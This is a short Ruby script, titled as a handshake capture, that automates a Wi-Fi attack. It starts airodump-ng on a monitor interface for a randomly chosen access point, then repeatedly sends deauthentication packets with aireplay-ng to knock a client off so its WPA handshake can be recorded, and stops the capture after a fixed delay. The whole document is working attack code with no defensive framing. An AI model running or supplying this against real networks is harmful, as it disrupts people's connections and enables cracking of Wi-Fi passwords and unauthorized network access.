#Hanshake capture

def aireplay_runner stations = Array.new
	
	if stations[0].nil?
		puts "Error: No stations found"
		return -1;
	end
	
	
	r = stations.sample
	
	p = IO.popen("sudo airodump-ng mon0 --bssid #{r.get("bssid")} -c 10 -w replay --ivs")


	fork do 
		sleep(2)
		3.times do
			system("sudo aireplay-ng -0 1 -a #{r.get("bssid")} -c #{r.get("stmac")} mon0")
			sleep(5)
		end
	end


	pid = p.pid
	n = 28
	sleep(n)
	Process.kill("INT", pid)

	
end


